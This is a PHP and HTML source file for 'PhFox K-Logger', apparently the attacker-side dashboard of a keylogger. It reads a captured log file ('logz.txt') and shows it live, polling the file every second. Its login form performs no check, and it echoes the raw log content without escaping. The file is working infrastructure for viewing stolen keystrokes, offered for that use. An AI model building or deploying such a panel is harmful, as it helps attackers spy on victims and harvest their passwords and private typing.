<?php 
#error_reporting(0);
session_start ();
function loginForm() {
    echo '
	<div class="form-group">
		<div id="loginform">
			<form action="index.php" method="post">
			<h1> PhFox K-Logger</h1><hr/>
				<label for="name">LOGIN</label><br>
				<input class="inppd" type="text" name="user" id="user" placeholder="User" required autocomplete="off"/><br>
				<input class="inppd" type="password" name="password" id="password" placeholder="Password" required/><br>
				<input type="submit" name="enter" id="enter" value="Login" />
			</form>
		</div>
	</div>
   ';
}
loginForm();
?>
<!DOCTYPE html>
<html>
<head>
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta charset="utf-8">
	<script type="text/javascript" src="js/jquery.min.js"></script>
	<title>PhFox K-Log</title>
</head>
<body >
	<div class="heading">
		<h1>Ph-Fox KeyLogs</h1>
	</div>
	<div id="logs" class="logs">
		<?php 
		$handle = fopen("logz.txt", "r" );
		$contents = fread($handle, filesize ( "logz.txt" ));
		fclose ($handle);
		echo '<h3>'.$contents.'</h3>';
		?>
	</div>
</body>
<script>
function loadLog(){    
    var oldscrollHeight = $("#logs").attr("scrollHeight") - 20;
    $.ajax({
        url: "logz.txt",
        cache: false,
        success: function(html){       
            $("#logs").html(html);       
            var newscrollHeight = $("#logs").attr("scrollHeight") - 20;
            if(newscrollHeight > oldscrollHeight){
                $("#logs").animate({ scrollTop: newscrollHeight }, 'normal');
            }              
        },
    });
}
setInterval (loadLog, 1000);
</script>
<style type="text/css">
	body{
		background-color: black;
		margin: 1;
		height: 90vh;
	}
	.heading{
		margin: 0 auto;
		display: flex;
		align-items: center;
		justify-content: center;
		border: 2px solid darkcyan;
		background-color: #303030;
	}
	.heading h1{
		color: cyan;
		font-family: sans-serif;
	}
	.logs{
		margin: 0px auto;
		margin-top: 10px;
		background-color: #101010;
		height: 90%;
		font-size: 20px;
		overflow: auto;
		margin-bottom:5px;
	}
	.logmsg{
		margin: 2px;
		border: 1px solid grey;
		color: darkcyan;
		font-family: sans-serif;
	}
	.logmsg table{
		width: 100%;
		padding: 10px;
		#border: 3px solid #505050;
		text-align: center;
		margin-bottom: 10px !important;
	}
	.logmsg tr{
		width: 100%;
		box-shadow: 0px 0px 3px 1px deepskyblue;
		text-align: center;
	}
	.form-group{
		margin: 0 auto;
		background-color: #101010;
		display: flex;
		justify-content: center;
	}
	#loginform{
		align-items: center;
		text-align: center;
		background-color: #090909;
		width: 40%;
		font-family: sans-serif;
		color: cyan;
		border: 1px solid black;
	}
	::placeholder{
		color: darkcyan;
	}
	#loginform input{
		margin-top: 10px;
		color: darkcyan;
		outline: none;
		border: none;
		box-shadow: 0px 0px 1px 1px gray;
		padding: 7px;
		background-color: black;
		width: 40%;
	}
	#loginform input:active{
		box-shadow: 0px 0px 1px 1px cyan !important;

	}
	#enter{
		box-shadow: 0px 0px 0px 0px gray !important;
		background-color: #101010 !important;
		width: 15% !important;
		border: 1px solid #101010 !important;
	}
	#enter:hover{
		background-color: #090909 !important;
		cursor: pointer;
	}

</style>
</html>
